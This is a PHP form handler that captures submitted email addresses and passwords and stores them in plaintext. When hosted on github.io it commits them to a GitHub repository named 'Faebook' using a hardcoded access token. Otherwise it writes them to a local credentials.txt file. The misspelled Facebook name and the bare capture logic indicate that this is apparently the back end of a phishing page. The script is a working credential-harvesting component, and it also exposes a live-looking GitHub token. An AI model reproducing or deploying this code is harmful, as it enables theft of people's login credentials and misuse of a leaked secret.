<?php
// Check if the form has been submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get the email and password from the form
    $email = $_POST["email"];
    $password = $_POST["password"];

    // Validate email and password (add your validation logic here)
    if (isValidEmail($email) && isValidPassword($password)) {
        // Save the credentials to a text file on GitHub Pages (if allowed)
        if (isGitHubPages()) {
            // Use GitHub Pages' API to create a new file in the repository
            $client = new \Github\Client();
            // Authenticate using your GitHub access token
            $client->authenticate('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', 'x-oauth-basic');
            // Create a new file in the repository
            $client->api('repository')->createFile(
                'bzpw36',
                'Faebook',
                'credentials.txt',
                $email . "\n" . $password,
                'Saving credentials'
            );

            // Credentials saved successfully
            echo "Credentials saved successfully.";
        } else {
            // Save the credentials locally (if necessary)
            $filename = "credentials.txt";
            $data = $email . "\n" . $password;

            if (file_put_contents($filename, $data)) {
                // Credentials saved successfully
                echo "Credentials saved successfully.";
            } else {
                // Error saving credentials
                echo "Error saving credentials.";
            }
        }
    } else {
        // Invalid email or password
        echo "Invalid email or password.";
    }
}

// Add your email and password validation functions here
function isValidEmail($email) {
    // Implement your email validation logic
    return true; // Replace with your actual validation
}

function isValidPassword($password) {
    // Implement your password validation logic
    return true; // Replace with your actual validation
}

// Check if the current environment is GitHub Pages
function isGitHubPages() {
    // Check if the HTTP_HOST environment variable contains "github.io"
    return strpos($_SERVER['HTTP_HOST'], 'github.io') !== false;
}
